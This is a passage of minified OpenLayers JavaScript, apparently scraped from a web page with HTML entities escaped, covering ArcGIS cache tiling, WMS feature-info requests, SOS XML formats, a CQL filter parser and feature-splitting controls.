d.fullExtent.xmax,d.fullExtent.ymax);this.projection="EPSG:"+d.spatialReference.wkid;this.sphericalMercator=102100==d.spatialReference.wkid;this.units="esriFeet"==d.units?"ft":"m";if(d.tileInfo){this.tileSize=new OpenLayers.Size(d.tileInfo.width||d.tileInfo.cols,d.tileInfo.height||d.tileInfo.rows);this.tileOrigin=new OpenLayers.LonLat(d.tileInfo.origin.x,d.tileInfo.origin.y);var f=new OpenLayers.Geometry.Point(e.left,e.top),e=new OpenLayers.Geometry.Point(e.right,e.bottom);this.useScales?this.scales= []:this.resolutions=[];this.lods=[];for(var g in d.tileInfo.lods)if(d.tileInfo.lods.hasOwnProperty(g)){var h=d.tileInfo.lods[g];this.useScales?this.scales.push(h.scale):this.resolutions.push(h.resolution);var k=this.getContainingTileCoords(f,h.resolution);h.startTileCol=k.x;h.startTileRow=k.y;k=this.getContainingTileCoords(e,h.resolution);h.endTileCol=k.x;h.endTileRow=k.y;this.lods.push(h)}this.maxExtent=this.calculateMaxExtentWithLOD(this.lods[0]);this.serverResolutions=this.resolutions;this.overrideDPI&amp;&amp; d.tileInfo.dpi&amp;&amp;(OpenLayers.DOTS_PER_INCH=d.tileInfo.dpi)}}},getContainingTileCoords:function(a,b){return new OpenLayers.Pixel(Math.max(Math.floor((a.x-this.tileOrigin.lon)/(this.tileSize.w*b)),0),Math.max(Math.floor((this.tileOrigin.lat-a.y)/(this.tileSize.h*b)),0))},calculateMaxExtentWithLOD:function(a){var b=this.tileOrigin.lon+a.startTileCol*this.tileSize.w*a.resolution,c=this.tileOrigin.lat-a.startTileRow*this.tileSize.h*a.resolution;return new OpenLayers.Bounds(b,c-(a.endTileRow-a.startTileRow+ 1)*this.tileSize.h*a.resolution,b+(a.endTileCol-a.startTileCol+1)*this.tileSize.w*a.resolution,c)},calculateMaxExtentWithExtent:function(a,b){var c=new OpenLayers.Geometry.Point(a.left,a.top),d=new OpenLayers.Geometry.Point(a.right,a.bottom),c=this.getContainingTileCoords(c,b),d=this.getContainingTileCoords(d,b);return this.calculateMaxExtentWithLOD({resolution:b,startTileCol:c.x,startTileRow:c.y,endTileCol:d.x,endTileRow:d.y})},getUpperLeftTileCoord:function(a){var b=new OpenLayers.Geometry.Point(this.maxExtent.left, this.maxExtent.top);return this.getContainingTileCoords(b,a)},getLowerRightTileCoord:function(a){var b=new OpenLayers.Geometry.Point(this.maxExtent.right,this.maxExtent.bottom);return this.getContainingTileCoords(b,a)},getMaxExtentForResolution:function(a){var b=this.getUpperLeftTileCoord(a),c=this.getLowerRightTileCoord(a),d=this.tileOrigin.lon+b.x*this.tileSize.w*a,e=this.tileOrigin.lat-b.y*this.tileSize.h*a;return new OpenLayers.Bounds(d,e-(c.y-b.y+1)*this.tileSize.h*a,d+(c.x-b.x+1)*this.tileSize.w* a,e)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.ArcGISCache(this.name,this.url,this.options));return OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},initGriddedTiles:function(a){delete this._tileOrigin;OpenLayers.Layer.XYZ.prototype.initGriddedTiles.apply(this,arguments)},getMaxExtent:function(){var a=this.map.getResolution();return this.maxExtent=this.getMaxExtentForResolution(a)},getTileOrigin:function(){if(!this._tileOrigin){var a=this.getMaxExtent();this._tileOrigin=new OpenLayers.LonLat(a.left, a.bottom)}return this._tileOrigin},getURL:function(a){var b=this.getResolution(),c=this.tileOrigin.lon+b*this.tileSize.w/2,d=this.tileOrigin.lat-b*this.tileSize.h/2;a=a.getCenterLonLat();c=Math.round(Math.abs((a.lon-c)/(b*this.tileSize.w)));d=Math.round(Math.abs((d-a.lat)/(b*this.tileSize.h)));a=this.map.getZoom();if(this.lods){if(b=this.lods[this.map.getZoom()],c&lt;b.startTileCol||c>b.endTileCol||d&lt;b.startTileRow||d>b.endTileRow)return null}else{var e=this.getUpperLeftTileCoord(b),b=this.getLowerRightTileCoord(b); if(c&lt;e.x||c>=b.x||d&lt;e.y||d>=b.y)return null}b=this.url;e=""+c+d+a;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(e,b));this.useArcGISServer?b+="/tile/${z}/${y}/${x}":(c="C"+OpenLayers.Number.zeroPad(c,8,16),d="R"+OpenLayers.Number.zeroPad(d,8,16),a="L"+OpenLayers.Number.zeroPad(a,2,10),b=b+"/${z}/${y}/${x}."+this.type);b=OpenLayers.String.format(b,{x:c,y:d,z:a});return OpenLayers.Util.urlAppend(b,OpenLayers.Util.getParameterString(this.params))},CLASS_NAME:"OpenLayers.Layer.ArcGISCache"});OpenLayers.Control.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,{hover:!1,drillDown:!1,maxFeatures:10,clickCallback:"click",output:"features",layers:null,queryVisible:!1,url:null,layerUrls:null,infoFormat:"text/html",vendorParams:{},format:null,formatOptions:null,handler:null,hoverRequest:null,initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions)); !0===this.drillDown&amp;&amp;(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.getInfoForHover},OpenLayers.Util.extend(this.handlerOptions.hover||{},{delay:250})):(a={},a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||{}))},getInfoForClick:function(a){this.events.triggerEvent("beforegetfeatureinfo",{xy:a.xy});OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait");this.request(a.xy, {})},getInfoForHover:function(a){this.events.triggerEvent("beforegetfeatureinfo",{xy:a.xy});this.request(a.xy,{hover:!0})},cancelHover:function(){this.hoverRequest&amp;&amp;(this.hoverRequest.abort(),this.hoverRequest=null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d,e=a.length-1;0&lt;=e;--e)c=a[e],c instanceof OpenLayers.Layer.WMS&amp;&amp;(!this.queryVisible||c.getVisibility())&amp;&amp;(d=OpenLayers.Util.isArray(c.url)?c.url[0]:c.url,!1!==this.drillDown||this.url||(this.url=d),(!0===this.drillDown|| this.urlMatches(d))&amp;&amp;b.push(c));return b},urlMatches:function(a){var b=OpenLayers.Util.isEquivalentUrl(this.url,a);if(!b&amp;&amp;this.layerUrls)for(var c=0,d=this.layerUrls.length;c&lt;d;++c)if(OpenLayers.Util.isEquivalentUrl(this.layerUrls[c],a)){b=!0;break}return b},buildWMSOptions:function(a,b,c,d){for(var e=[],f=[],g=0,h=b.length;g&lt;h;g++)null!=b[g].params.LAYERS&amp;&amp;(e=e.concat(b[g].params.LAYERS),f=f.concat(this.getStyleNames(b[g])));b=b[0];g=this.map.getProjection();(h=b.projection)&amp;&amp;h.equals(this.map.getProjectionObject())&amp;&amp; (g=h.getCode());d=OpenLayers.Util.extend({service:"WMS",version:b.params.VERSION,request:"GetFeatureInfo",exceptions:b.params.EXCEPTIONS,bbox:this.map.getExtent().toBBOX(null,b.reverseAxisOrder()),feature_count:this.maxFeatures,height:this.map.getSize().h,width:this.map.getSize().w,format:d,info_format:b.params.INFO_FORMAT||this.infoFormat},1.3&lt;=parseFloat(b.params.VERSION)?{crs:g,i:parseInt(c.x),j:parseInt(c.y)}:{srs:g,x:parseInt(c.x),y:parseInt(c.y)});0!=e.length&amp;&amp;(d=OpenLayers.Util.extend({layers:e, query_layers:e,styles:f},d));OpenLayers.Util.applyDefaults(d,this.vendorParams);return{url:a,params:OpenLayers.Util.upperCaseObject(d),callback:function(b){this.handleResponse(c,b,a)},scope:this}},getStyleNames:function(a){return a.params.STYLES?a.params.STYLES:OpenLayers.Util.isArray(a.params.LAYERS)?Array(a.params.LAYERS.length):a.params.LAYERS.replace(/[^,]/g,"")},request:function(a,b){var c=this.findLayers();if(0==c.length)this.events.triggerEvent("nogetfeatureinfo"),OpenLayers.Element.removeClass(this.map.viewPortDiv, "olCursorWait");else if(b=b||{},!1===this.drillDown){var c=this.buildWMSOptions(this.url,c,a,c[0].params.FORMAT),d=OpenLayers.Request.GET(c);!0===b.hover&amp;&amp;(this.hoverRequest=d)}else{this._numRequests=this._requestCount=0;this.features=[];for(var d={},e,f=0,g=c.length;f&lt;g;f++){var h=c[f];e=OpenLayers.Util.isArray(h.url)?h.url[0]:h.url;e in d?d[e].push(h):(this._numRequests++,d[e]=[h])}for(e in d)c=d[e],c=this.buildWMSOptions(e,c,a,c[0].params.FORMAT),OpenLayers.Request.GET(c)}},triggerGetFeatureInfo:function(a, b,c){this.events.triggerEvent("getfeatureinfo",{text:a.responseText,features:c,request:a,xy:b});OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait")},handleResponse:function(a,b,c){var d=b.responseXML;d&amp;&amp;d.documentElement||(d=b.responseText);d=this.format.read(d);!1===this.drillDown?this.triggerGetFeatureInfo(b,a,d):(this._requestCount++,this._features="object"===this.output?(this._features||[]).concat({url:c,features:d}):(this._features||[]).concat(d),this._requestCount===this._numRequests&amp;&amp; (this.triggerGetFeatureInfo(b,a,this._features.concat()),delete this._features,delete this._requestCount,delete this._numRequests))},CLASS_NAME:"OpenLayers.Control.WMSGetFeatureInfo"});OpenLayers.Format.WMSCapabilities.v1_3_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_3,{version:"1.3.0",CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_3_0"});OpenLayers.Format.SOSGetFeatureOfInterest=OpenLayers.Class(OpenLayers.Format.XML,{VERSION:"1.0.0",namespaces:{sos:"http://www.opengis.net/sos/1.0",gml:"http://www.opengis.net/gml",sa:"http://www.opengis.net/sampling/1.0",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosAll.xsd",defaultPrefix:"sos",regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={features:[]};this.readNode(a,b);a=[];for(var c=0,d=b.features.length;c&lt;d;c++){var e=b.features[c];this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;e.components[0])&amp;&amp;e.components[0].transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(e.components[0],e.attributes);a.push(e)}return a},readers:{sa:{SamplingPoint:function(a,b){if(!b.attributes){var c= {attributes:{}};b.features.push(c);b=c}b.attributes.id=this.getAttributeNS(a,this.namespaces.gml,"id");this.readChildNodes(a,b)},position:function(a,b){this.readChildNodes(a,b)}},gml:OpenLayers.Util.applyDefaults({FeatureCollection:function(a,b){this.readChildNodes(a,b)},featureMember:function(a,b){var c={attributes:{}};b.features.push(c);this.readChildNodes(a,c)},name:function(a,b){b.attributes.name=this.getChildValue(a)},pos:function(a,b){this.externalProjection||(this.externalProjection=new OpenLayers.Projection(a.getAttribute("srsName"))); OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[a,b])}},OpenLayers.Format.GML.v3.prototype.readers.gml)},writers:{sos:{GetFeatureOfInterest:function(a){for(var b=this.createElementNSPlus("GetFeatureOfInterest",{attributes:{version:this.VERSION,service:"SOS","xsi:schemaLocation":this.schemaLocation}}),c=0,d=a.fois.length;c&lt;d;c++)this.writeNode("FeatureOfInterestId",{foi:a.fois[c]},b);return b},FeatureOfInterestId:function(a){return this.createElementNSPlus("FeatureOfInterestId",{value:a.foi})}}}, CLASS_NAME:"OpenLayers.Format.SOSGetFeatureOfInterest"});OpenLayers.Format.SOSGetObservation=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:"http://www.opengis.net/ows",gml:"http://www.opengis.net/gml",sos:"http://www.opengis.net/sos/1.0",ogc:"http://www.opengis.net/ogc",om:"http://www.opengis.net/om/1.0",sa:"http://www.opengis.net/sampling/1.0",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosGetObservation.xsd", defaultPrefix:"sos",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={measurements:[],observations:[]};this.readNode(a,b);return b},write:function(a){a=this.writeNode("sos:GetObservation",a);a.setAttribute("xmlns:om",this.namespaces.om);a.setAttribute("xmlns:ogc",this.namespaces.ogc);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this, [a])},readers:{om:{ObservationCollection:function(a,b){b.id=this.getAttributeNS(a,this.namespaces.gml,"id");this.readChildNodes(a,b)},member:function(a,b){this.readChildNodes(a,b)},Measurement:function(a,b){var c={};b.measurements.push(c);this.readChildNodes(a,c)},Observation:function(a,b){var c={};b.observations.push(c);this.readChildNodes(a,c)},samplingTime:function(a,b){var c={};b.samplingTime=c;this.readChildNodes(a,c)},observedProperty:function(a,b){b.observedProperty=this.getAttributeNS(a,this.namespaces.xlink, "href");this.readChildNodes(a,b)},procedure:function(a,b){b.procedure=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)},featureOfInterest:function(a,b){var c={features:[]};b.fois=[];b.fois.push(c);this.readChildNodes(a,c);for(var d=[],e=0,f=c.features.length;e&lt;f;e++){var g=c.features[e];d.push(new OpenLayers.Feature.Vector(g.components[0],g.attributes))}c.features=d},result:function(a,b){var c={};b.result=c;""!==this.getChildValue(a)?(c.value=this.getChildValue(a),c.uom= a.getAttribute("uom")):this.readChildNodes(a,c)}},sa:OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.sa,gml:OpenLayers.Util.applyDefaults({TimeInstant:function(a,b){var c={};b.timeInstant=c;this.readChildNodes(a,c)},timePosition:function(a,b){b.timePosition=this.getChildValue(a)}},OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.gml)},writers:{sos:{GetObservation:function(a){var b=this.createElementNSPlus("GetObservation",{attributes:{version:this.VERSION,service:"SOS"}});this.writeNode("offering", a,b);a.eventTime&amp;&amp;this.writeNode("eventTime",a,b);for(var c in a.procedures)this.writeNode("procedure",a.procedures[c],b);for(var d in a.observedProperties)this.writeNode("observedProperty",a.observedProperties[d],b);a.foi&amp;&amp;this.writeNode("featureOfInterest",a.foi,b);this.writeNode("responseFormat",a,b);a.resultModel&amp;&amp;this.writeNode("resultModel",a,b);a.responseMode&amp;&amp;this.writeNode("responseMode",a,b);return b},featureOfInterest:function(a){var b=this.createElementNSPlus("featureOfInterest");this.writeNode("ObjectID", a.objectId,b);return b},ObjectID:function(a){return this.createElementNSPlus("ObjectID",{value:a})},responseFormat:function(a){return this.createElementNSPlus("responseFormat",{value:a.responseFormat})},procedure:function(a){return this.createElementNSPlus("procedure",{value:a})},offering:function(a){return this.createElementNSPlus("offering",{value:a.offering})},observedProperty:function(a){return this.createElementNSPlus("observedProperty",{value:a})},eventTime:function(a){var b=this.createElementNSPlus("eventTime"); "latest"===a.eventTime&amp;&amp;this.writeNode("ogc:TM_Equals",a,b);return b},resultModel:function(a){return this.createElementNSPlus("resultModel",{value:a.resultModel})},responseMode:function(a){return this.createElementNSPlus("responseMode",{value:a.responseMode})}},ogc:{TM_Equals:function(a){var b=this.createElementNSPlus("ogc:TM_Equals");this.writeNode("ogc:PropertyName",{property:"urn:ogc:data:time:iso8601"},b);"latest"===a.eventTime&amp;&amp;this.writeNode("gml:TimeInstant",{value:"latest"},b);return b},PropertyName:function(a){return this.createElementNSPlus("ogc:PropertyName", {value:a.property})}},gml:{TimeInstant:function(a){var b=this.createElementNSPlus("gml:TimeInstant");this.writeNode("gml:timePosition",a,b);return b},timePosition:function(a){return this.createElementNSPlus("gml:timePosition",{value:a.value})}}},CLASS_NAME:"OpenLayers.Format.SOSGetObservation"});OpenLayers.Control.UTFGrid=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,layers:null,defaultHandlerOptions:{delay:300,pixelTolerance:4,stopMove:!1,single:!0,"double":!1,stopSingle:!1,stopDouble:!1},handlerMode:"click",setHandler:function(a){this.handlerMode=a;this.resetHandler()},resetHandler:function(){this.handler&amp;&amp;(this.handler.deactivate(),this.handler.destroy(),this.handler=null);"hover"==this.handlerMode?this.handler=new OpenLayers.Handler.Hover(this,{pause:this.handleEvent,move:this.reset}, this.handlerOptions):"click"==this.handlerMode?this.handler=new OpenLayers.Handler.Click(this,{click:this.handleEvent},this.handlerOptions):"move"==this.handlerMode&amp;&amp;(this.handler=new OpenLayers.Handler.Hover(this,{pause:this.handleEvent,move:this.handleEvent},this.handlerOptions));return this.handler?!0:!1},initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||this.defaultHandlerOptions;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.resetHandler()},handleEvent:function(a){if(null== a)this.reset();else{var b=this.map.getLonLatFromPixel(a.xy);if(b){var c=this.findLayers();if(0&lt;c.length){for(var d={},e,f,g=0,h=c.length;g&lt;h;g++)e=c[g],f=OpenLayers.Util.indexOf(this.map.layers,e),d[f]=e.getFeatureInfo(b);this.callback(d,b,a.xy)}}}},callback:function(a){},reset:function(a){this.callback(null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0&lt;=d;--d)c=a[d],c instanceof OpenLayers.Layer.UTFGrid&amp;&amp;b.push(c);return b},CLASS_NAME:"OpenLayers.Control.UTFGrid"});OpenLayers.Format.CQL=function(){function a(a){function b(){var a=e.pop();switch(a.type){case "LOGICAL":var c=b(),g=b();return new OpenLayers.Filter.Logical({filters:[g,c],type:f[a.text.toUpperCase()]});case "NOT":return a=b(),new OpenLayers.Filter.Logical({filters:[a],type:OpenLayers.Filter.Logical.NOT});case "BETWEEN":return e.pop(),g=b(),a=b(),c=b(),new OpenLayers.Filter.Comparison({property:c,lowerBoundary:a,upperBoundary:g,type:OpenLayers.Filter.Comparison.BETWEEN});case "COMPARISON":return g= b(),c=b(),new OpenLayers.Filter.Comparison({property:c,value:g,type:d[a.text.toUpperCase()]});case "IS_NULL":return c=b(),new OpenLayers.Filter.Comparison({property:c,type:d[a.text.toUpperCase()]});case "VALUE":return(c=a.text.match(/^'(.*)'$/))?c[1].replace(/''/g,"'"):Number(a.text);case "SPATIAL":switch(a.text.toUpperCase()){case "BBOX":var a=b(),c=b(),g=b(),h=b(),k=b();return new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,property:k,value:OpenLayers.Bounds.fromArray([h,g,c, a])});case "INTERSECTS":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:c,value:g});case "WITHIN":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.WITHIN,property:c,value:g});case "CONTAINS":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.CONTAINS,property:c,value:g});case "DWITHIN":return a=b(),g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,value:g, property:c,distance:Number(a)})}case "GEOMETRY":return OpenLayers.Geometry.fromWKT(a.text);default:return a.text}}for(var c=[],e=[];a.length;){var g=a.shift();switch(g.type){case "PROPERTY":case "GEOMETRY":case "VALUE":e.push(g);break;case "COMPARISON":case "BETWEEN":case "IS_NULL":case "LOGICAL":for(var k=h[g.type];0&lt;c.length&amp;&amp;h[c[c.length-1].type]&lt;=k;)e.push(c.pop());c.push(g);break;case "SPATIAL":case "NOT":case "LPAREN":c.push(g);break;case "RPAREN":for(;0&lt;c.length&amp;&amp;"LPAREN"!=c[c.length-1].type;)e.push(c.pop()); c.pop();0&lt;c.length&amp;&amp;"SPATIAL"==c[c.length-1].type&amp;&amp;e.push(c.pop());case "COMMA":case "END":break;default:throw Error("Unknown token type "+g.type);}}for(;0&lt;c.length;)e.push(c.pop());a=b();if(0&lt;e.length){a="Remaining tokens after building AST: \n";for(c=e.length-1;0&lt;=c;c--)a+=e[c].type+": "+e[c].text+"\n";throw Error(a);}return a}var b={PROPERTY:/^[_a-zA-Z]\w*/,COMPARISON:/^(=|&lt;>|&lt;=|&lt;|>=|>|LIKE)/i,IS_NULL:/^IS NULL/i,COMMA:/^,/,LOGICAL:/^(AND|OR)/i,VALUE:/^('([^']|'')*'|\d+(\.\d*)?|\.\d+)/,LPAREN:/^\(/, RPAREN:/^\)/,SPATIAL:/^(BBOX|INTERSECTS|DWITHIN|WITHIN|CONTAINS)/i,NOT:/^NOT/i,BETWEEN:/^BETWEEN/i,GEOMETRY:function(a){var b=/^(POINT|LINESTRING|POLYGON|MULTIPOINT|MULTILINESTRING|MULTIPOLYGON|GEOMETRYCOLLECTION)/.exec(a);if(b){var c=a.length,b=a.indexOf("(",b[0].length);if(-1&lt;b)for(var d=1;b&lt;c&amp;&amp;0&lt;d;)switch(b++,a.charAt(b)){case "(":d++;break;case ")":d--}return[a.substr(0,b+1)]}},END:/^$/},c={LPAREN:["GEOMETRY","SPATIAL","PROPERTY","VALUE","LPAREN"],RPAREN:["NOT","LOGICAL","END","RPAREN"],PROPERTY:["COMPARISON", "BETWEEN","COMMA","IS_NULL"],BETWEEN:["VALUE"],IS_NULL:["END"],COMPARISON:["VALUE"],COMMA:["GEOMETRY","VALUE","PROPERTY"],VALUE:["LOGICAL","COMMA","RPAREN","END"],SPATIAL:["LPAREN"],LOGICAL:["NOT","VALUE","SPATIAL","PROPERTY","LPAREN"],NOT:["PROPERTY","LPAREN"],GEOMETRY:["COMMA","RPAREN"]},d={"=":OpenLayers.Filter.Comparison.EQUAL_TO,"&lt;>":OpenLayers.Filter.Comparison.NOT_EQUAL_TO,"&lt;":OpenLayers.Filter.Comparison.LESS_THAN,"&lt;=":OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO,">":OpenLayers.Filter.Comparison.GREATER_THAN, ">=":OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO,LIKE:OpenLayers.Filter.Comparison.LIKE,BETWEEN:OpenLayers.Filter.Comparison.BETWEEN,"IS NULL":OpenLayers.Filter.Comparison.IS_NULL},e={},f={AND:OpenLayers.Filter.Logical.AND,OR:OpenLayers.Filter.Logical.OR},g={},h={RPAREN:3,LOGICAL:2,COMPARISON:1},k;for(k in d)d.hasOwnProperty(k)&amp;&amp;(e[d[k]]=k);for(k in f)f.hasOwnProperty(k)&amp;&amp;(g[f[k]]=k);return OpenLayers.Class(OpenLayers.Format,{read:function(d){var e=d;d=[];var f,g=["NOT","GEOMETRY","SPATIAL", "PROPERTY","LPAREN"];do{a:{f=g;for(var h=void 0,g=void 0,k=f.length,h=0;h&lt;k;h++){var g=f[h],s=b[g]instanceof RegExp?b[g].exec(e):(0,b[g])(e);if(s){f=s[0];e=e.substr(f.length).replace(/^\s*/,"");f={type:g,text:f,remainder:e};break a}}d="ERROR: In parsing: ["+e+"], expected one of: ";for(h=0;h&lt;k;h++)g=f[h],d+="\n "+g+": "+b[g];throw Error(d);}e=f.remainder;g=c[f.type];if("END"!=f.type&amp;&amp;!g)throw Error("No follows list for "+f.type);d.push(f)}while("END"!=f.type);d=a(d);this.keepData&amp;&amp;(this.data=d); return d},write:function(a){if(a instanceof OpenLayers.Geometry)return a.toString();switch(a.CLASS_NAME){case "OpenLayers.Filter.Spatial":switch(a.type){case OpenLayers.Filter.Spatial.BBOX:return"BBOX("+a.property+","+a.value.toBBOX()+")";case OpenLayers.Filter.Spatial.DWITHIN:return"DWITHIN("+a.property+", "+this.write(a.value)+", "+a.distance+")";case OpenLayers.Filter.Spatial.WITHIN:return"WITHIN("+a.property+", "+this.write(a.value)+")";case OpenLayers.Filter.Spatial.INTERSECTS:return"INTERSECTS("+ a.property+", "+this.write(a.value)+")";case OpenLayers.Filter.Spatial.CONTAINS:return"CONTAINS("+a.property+", "+this.write(a.value)+")";default:throw Error("Unknown spatial filter type: "+a.type);}case "OpenLayers.Filter.Logical":if(a.type==OpenLayers.Filter.Logical.NOT)return"NOT ("+this.write(a.filters[0])+")";for(var b="(",c=!0,d=0;d&lt;a.filters.length;d++)c?c=!1:b+=") "+g[a.type]+" (",b+=this.write(a.filters[d]);return b+")";case "OpenLayers.Filter.Comparison":return a.type==OpenLayers.Filter.Comparison.BETWEEN? a.property+" BETWEEN "+this.write(a.lowerBoundary)+" AND "+this.write(a.upperBoundary):null!==a.value?a.property+" "+e[a.type]+" "+this.write(a.value):a.property+" "+e[a.type];case void 0:if("string"===typeof a)return"'"+a.replace(/'/g,"''")+"'";if("number"===typeof a)return String(a);default:throw Error("Can't encode: "+a.CLASS_NAME+" "+a);}},CLASS_NAME:"OpenLayers.Format.CQL"})}();OpenLayers.Control.Split=OpenLayers.Class(OpenLayers.Control,{layer:null,source:null,sourceOptions:null,tolerance:null,edge:!0,deferDelete:!1,mutual:!0,targetFilter:null,sourceFilter:null,handler:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||{};this.options.source&amp;&amp;this.setSource(this.options.source)},setSource:function(a){this.active?(this.deactivate(),this.handler&amp;&amp;(this.handler.destroy(),delete this.handler),this.source=a,this.activate()):this.source= a},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a)if(!this.source)this.handler||(this.handler=new OpenLayers.Handler.Path(this,{done:function(a){this.onSketchComplete({feature:new OpenLayers.Feature.Vector(a)})}},{layerOptions:this.sourceOptions})),this.handler.activate();else if(this.source.events)this.source.events.on({sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this});return a},deactivate:function(){var a=OpenLayers.Control.prototype.deactivate.call(this); a&amp;&amp;this.source&amp;&amp;this.source.events&amp;&amp;this.source.events.un({sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this});return a},onSketchComplete:function(a){this.feature=null;return!this.considerSplit(a.feature)},afterFeatureModified:function(a){a.modified&amp;&amp;"function"===typeof a.feature.geometry.split&amp;&amp;(this.feature=a.feature,this.considerSplit(a.feature))},removeByGeometry:function(a,b){for(var c=0,d=a.length;c&lt;d;++c)if(a[c].geometry===b){a.splice(c,1);break}}, isEligible:function(a){return a.geometry?a.state!==OpenLayers.State.DELETE&amp;&amp;"function"===typeof a.geometry.split&amp;&amp;this.feature!==a&amp;&amp;(!this.targetFilter||this.targetFilter.evaluate(a.attributes)):!1},considerSplit:function(a){var b=!1,c=!1;if(!this.sourceFilter||this.sourceFilter.evaluate(a.attributes)){for(var d=this.layer&amp;&amp;this.layer.features||[],e,f,g=[],h=[],k=this.layer===this.source&amp;&amp;this.mutual,l={edge:this.edge,tolerance:this.tolerance,mutual:k},m=[a.geometry],n,p,q,r=0,s=d.length;r&lt;s;++r)if(n= d[r],this.isEligible(n)){p=[n.geometry];for(var t=0;t&lt;m.length;++t){q=m[t];for(var u=0;u&lt;p.length;++u)if(e=p[u],q.getBounds().intersectsBounds(e.getBounds())&amp;&amp;(e=q.split(e,l)))f=this.events.triggerEvent("beforesplit",{source:a,target:n}),!1!==f&amp;&amp;(k&amp;&amp;(f=e[0],1&lt;f.length&amp;&amp;(f.unshift(t,1),Array.prototype.splice.apply(m,f),t+=f.length-3),e=e[1]),1&lt;e.length&amp;&amp;(e.unshift(u,1),Array.prototype.splice.apply(p,e),u+=e.length-3))}p&amp;&amp;1&lt;p.length&amp;&amp;(this.geomsToFeatures(n,p),this.events.triggerEvent("split",{original:n, features:p}),Array.prototype.push.apply(g,p),h.push(n),c=!0)}m&amp;&amp;1&lt;m.length&amp;&amp;(this.geomsToFeatures(a,m),this.events.triggerEvent("split",{original:a,features:m}),Array.prototype.push.apply(g,m),h.push(a),b=!0);if(b||c){if(this.deferDelete){d=[];r=0;for(s=h.length;r&lt;s;++r)c=h[r],c.state===OpenLayers.State.INSERT?d.push(c):(c.state=OpenLayers.State.DELETE,this.layer.drawFeature(c));this.layer.destroyFeatures(d,{silent:!0});r=0;for(s=g.length;r&lt;s;++r)g[r].state=OpenLayers.State.INSERT}else this.layer.destroyFeatures(h, {silent:!0});this.layer.addFeatures(g,{silent:!0});this.events.triggerEvent("aftersplit",{source:a,features:g})}}return b},geomsToFeatures:function(a,b){var c=a.clone();delete c.geometry;for(var d,e=0,f=b.length;e&lt;f;++e)d=c.clone(),d.geometry=b[e],d.state=OpenLayers.State.INSERT,b[e]=d},destroy:function(){this.active&amp;&amp;this.deactivate();OpenLayers.Control.prototype.destroy.call(this)},CLASS_NAME:"OpenLayers.Control.Split"});OpenLayers.Layer.WMTS=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,version:"1.0.0",requestEncoding:"KVP",url:null,layer:null,matrixSet:null,style:null,format:"image/jpeg",tileOrigin:null,tileFullExtent:null,formatSuffix:null,matrixIds:null,dimensions:null,params:null,zoomOffset:0,serverResolutions:null,formatSuffixMap:{"image/png":"png","image/png8":"png","image/png24":"png","image/png32":"png",png:"png","image/jpeg":"jpg","image/jpg":"jpg",jpeg:"jpg",jpg:"jpg"},matrix:null,initialize:function(a){var b= {url:!0,layer:!0,style:!0,matrixSet:!0},c;for(c in b)if(!(c in a))throw Error("Missing property '"+c+"' in layer 